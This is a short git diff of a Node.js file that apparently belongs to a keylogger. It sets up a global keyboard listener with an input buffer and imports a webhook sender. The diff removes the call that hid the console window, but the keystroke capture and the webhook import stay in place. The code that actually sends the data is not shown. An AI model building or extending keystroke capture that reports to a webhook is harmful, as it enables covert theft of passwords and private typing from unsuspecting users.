@@ -1,10 +1,8 @@
-const { hideConsole } = require('node-hide-console-window');
 const { GlobalKeyboardListener } = require("node-global-key-listener");
 const { sendWebhook } = require('../webhook');
 const loggerText  = require("../utils/loggerText");
 
 const v = new GlobalKeyboardListener();
-hideConsole();
 
 let inputBuffer = '';
 let timeoutId = null;
@@ -120,7 +118,6 @@ process.on('SIGINT', () => {
   const { sendWebhook } = require('../webhook');
   
   const v = new GlobalKeyboardListener();
-  hideConsole();
 
   let inputBuffer = '';
   let timeoutId = null;
